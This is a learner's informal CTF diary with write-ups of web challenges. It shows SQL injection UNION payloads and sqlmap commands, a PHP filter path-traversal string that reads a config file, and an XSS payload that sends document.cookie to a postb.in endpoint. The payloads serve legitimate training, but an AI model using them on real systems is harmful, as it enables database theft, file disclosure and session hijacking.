#view it in code mode for a smoother exp =)
warning , quite the extreme language usage forward as i mainly document challneges that i get stuck on , therefore a lil venting after challenge is quite essential 
This is more for self notes for me to refer back in the future if i by chance get somewhat stuck 




# ---  n.d
alright its 3 50 in the fcuking morning idk what better to do than ctf instad of sleeping, writeup time....

curl -X POST -d "username=admin&pass -d=71up-dnlkadsf" http://165.227.106.113/post.php
this is the challange link btw , you need to login to see -> https://ctflearn.com/challenge/114 

welp apparenntly this command is quite useful , yeah... 
curl or client URL can help you get the webpage from terminal (as if you dont have a browser....)
it also has parameters you can use to send data for example , nice right ? (as if a browser couldnt do it)
according to the curl -h , the -d parameter allows you to send data ain a form of http post request . honestly have no idea what the -X means ahah
ok i lied , the first part of the command curl -X POST is to specify the method using the -X parameter and POST being the method in this case(other methods such as GET)
the -d basically as mentioned above allows you to send/POST data and specifies the data you want to send 

ive completed my first writeup?
i like to call them notes or better known as references , writeup too formal for this bullshit 
for now this thing is named the bloodflame archive cuz i have no idea what to name it while also listening to ERB (would have been an amazing pun if i was writting thsi on ARCH instaed of ubuntu...)
y'knwo what , maybe this can be known better as my CTF diary since i yap so much bs here ahhahaa
aaaaaaaaany ways since i last formatted pc , i lost all my progress(diary) on SKR, gotta redo it here , for now this is all i have , im a poor man , poor of information 
its 4 01 , my sleep is fked, i havent finished my dailies , im going to sleep , need to contol the ctf addiction !!!


# --- n.d
I HAVE TO SAY , NO WEED OR GACHA PULLS SHOULD BE ABLE TO BEAT THE HIGH I JUST FELT SOLVING MY FIRST HARD CHALLANGE 
alright so heres the story and challenge link : https://ctflearn.com/challenge/149
so yeah this gonna be a long story , future me or whoever i share this with , get ready

the website has a simple ui that allows you to search for dogs by typing in an id (no checking btw)
after some test , there are 3 dogs in the database each with id 1-3
When each of these numbers are types in , the page displays the dog name , breed and color 

1st attempt starts with a basic sql injection from -> https://www.w3schools.com/sql/sql_injection.asp
The page then returned the data of all 3 dogs. 
This proves the site is inject-able and vulnerable.
Next step , find the damn flag...

In the challege tittle , it mentions union is a good command.
In sql , union basicaly uunites things, allowing the user to combinee the output of 2 select commands together provided they are of same datatype. 
Both select command also need to select the same command. 
Well, guess what i did , yes i tried to guess the style of the query like an idiot. 
1st guess : select * from dogs where id = 'userinput'
with this many attempts i took and none succeeded , not even outputting the 1st dog's name. 

After a few hours of searching , i came across something about information.schema.tables. 
OH , after 1 semester of sql , i didnt even know this table existed....
In fact , many more tables not only this one....
that aside, i tried to enter some strings like 

' UNION NULL,NULL,NULL,NULL -- 
as i figured that the table would only have a maximum of 4 columns.

' UNION SELECT * FROM information.schema.tables -- 
as i thought i might just get everything from that table, unfortunately no...

1 or 2 days later (i forgot , memory got hazy from all the sqli)
i looked up union attacks and even tried to intercept the request with burpsuite , no luck
Then i re-read the comments and saw a tool named sqlmap which many claimned to be the easiest way to do it. 
I looked up the github , and installed the tool on my ubuntu. 

At first i ran it  - python3 sqlmap.py -url "https://web.ctflearn.com/web8/?id=1"
not much return , following the error messages , i slowly finetune the command into this thing: 
python3 sqlmap.py -url "https://web.ctflearn.com/web8/?id=1" --technique=U --random-agent --dbms=mysql --tamper=space2comment

cant explain all but i know what some do
- url specifies the url to attack
- technique specifies the technique to use in this case being a union attack
- dbms specifies the database type which sqlmap has already found out being mysql
- i have absolutely no idea what the other 2 do but here is the explanation -> https://github.com/sqlmapproject/sqlmap/wiki/Usage

finally the program returned 3 files, a log file , target file and lastly a file named 'session.sqlite'
unfortunatly the session file could not be opened while both text files were repeated information showed in the terminal 
but it DID give something useful, which was the payload used to attack:

Parameter: id (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7071,0x736746507445514d6c6d794b6e65535a4d514a784959674a694474465443666e4145794e51454e41,0x7162787071),NULL-- -


i then used the payload to craete this attempt: 
1 UNION ALL SELECT NULL,CONCAT(0x71626a7071,0x736746507445514d6c6d794b6e65535a4d514a784959674a694474465443666e4145794e51454e41,0x7162787071),NULL,NULL-- -
it worked but only returned the decryped hex value in the input. 
references for this attempt : https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/ 

Next attempt :
1 UNION ALL SELECT TABLE_NAME,TABLE_TYPE,TABLE_CATALOG,TABLE_SCHEMA FROM information_schema.tables-- -
the page returned many tables but one felt off, it was w0w_y0u_f0und_m3
sadly it was not the flag...
references for this try : https://dev.mysql.com/doc/refman/8.4/en/information-schema-columns-table.htmlc , https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/

3rd attempt: 
1 UNION ALL SELECT TABLE_NAME,COLUMN_NAME,TABLE_SCHEMA,TABLE_CATALOG FROM information_schema.columns-- -
this time the page returned many things , including a column 'f0und_m3' from the table 'w0w_y0u_f0und_m3'


last attempt : 
1 UNION ALL SELECT NULL,f0und_m3,NULL,NULL FROM w0w_y0u_f0und_m3-- -
it returned the information of the first dog and the flag 

alright thats a grandfather level story , time to rest , enough games today 



# --- n.d
OK next one , this one not fully solve by me thanks to a community fella in their dc server , still gotta record this thing down for fun
This ctf is a indi one called 3108 , merdeka themed
challenge link (not sure how long it will be up) = https://b1bf68f7fd.bahterasiber.my/

When you open the link , you immediately get blasted by music which sets you in merdeka mood. THere are 3 songs, keranamu Malaysia , tanggal31 and Jalur Gemilang
there are 3 hyeriinks which will each display the lyrics of one of the songs and an audio player to play the song and sing along. 

starting of all web challenge it to look at its source code, it was short , very short
the entire script was :
    function setPage(page) {
        const encodedPage = btoa(page);
        document.cookie = "page=" + encodedPage + ";path=/";
        location.reload();
    }

so i tried to do path traversal first realizing i was dumb

then i followed the 5 line script which by the way wil trigger everytime one of the hyperlinks are clicked and set the "page" variable to the respective page
then it encodes the page in base 64 and sets it into the cookie named page
finally, it reloads the page 

i tried to use burpsuite for at least 5 hours trying different cookies and paths 
i even got access to etc/passwd and /bin/bash
that aside i also tried to extract information from the audio and even the BACKGROUND IMAGE using binwalk and stings, no luck.

finally after so many tries , time was up and i asked 
to apparently i was right but wrong, i used php wrapper but not on the config , only on the index file 


yeah thats it , you use the wrapper on the config file : php://filter/convert.base64-encode/resource=../../../var/www/html/config.php


the website returned : PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJHVzZXJuYW1lID0gImN1YmFhbiBtZW5nZWhhY2sga2EgaXR1IjsKJHBhc3N3b3JkID0gIjMxMDh7bTRyMV9rMXQ0X3c0cmc0X24zZzRyNH0iOwokZGF0YWJhc2UgPSAiZmxhZyI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VybmFtZSwgJHBhc3N3b3JkLCAkZGF0YWJhc2UpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9CgplY2hvICJDb25uZWN0ZWQgc3VjY2Vzc2Z1bGx5IjsKPz4K


when decoded we get the php file and BOOM its there : 
<?php
$host = "localhost";
$username = "cubaan mengehack ka itu";
$password = "3108{m4r1_k1t4_w4rg4_n3g4r4}";
$database = "flag";

$conn = new mysqli($host, $username, $password, $database);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "Connected successfully";
?>

# --- sep26-27 2024
i spent wayyyyyyyyyyyyyyyyyyyyyyyy too much time on this bs
this one is a challenge from SKR -> https://skrctf.me/challenges#XSS-GPT 
had to literally go through piles of writeups just to get to the flag 
references (totally not in APA)
https://ctftime.org/writeup/15817 
https://portswigger.net/web-security/cross-site-scripting/reflected#reflected-xss-in-different-contexts
https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Cross-Site-Scripting-XSS-Payloads.txt

special thankyou to postbin -> https://www.postb.in/

challenge starts of with a white ass site with a chat box and a report admin button
after reading the html, you are somewhat required to have an API key (which i have 0 idea on wtf it is) 
so i tried editing the parameter as one of the hints say and spammed random things into the apiKey parameter in the site, none worked as expected....
then i tried the classic xss to trigger alert and it worked, as in the entire site bugged out with a wall of error messages.

After some revisiting of the js, i had to change to payload to </script><script>alert("ayane")</script><script> for it to successfully trigger the xss
which then also completely broke the site
then i figured by clicking the report admin button (while the site is not broken) would send a post request to a page called reportAdmin with the api key parameter

after being stuck on the same thing for quite a while (2 hrs) i went to check out some wwriteups 
thats where i learnet that i can use postbin/webhook in combination with XSS to capture and send data to a given site 

after aa lot of spamming different payloads , this one worked (url encoded)

also first time making a code block here, yay
```
</script><script>var i=new Image;i.src="https://www.postb.in/1727372628601-9432018648367/?c="+document.cookie;</script><script>
```

then i replaced the kep parameter in the post request to the reportAdmin page and checked my postbin site , and there was the flag 
SKR{R3flec73D_1n_API_k3y_f4ae0d}

time to learn more on hwo this backend stuf and API work
anyways ending this on a good note, heres a banger i listened to while scritching my head -> https://youtu.be/DZTXaq23534

quick take away to self, please please please inspect the code carefully and if possible in visual studio code so you dont miss any pages or fucntion....










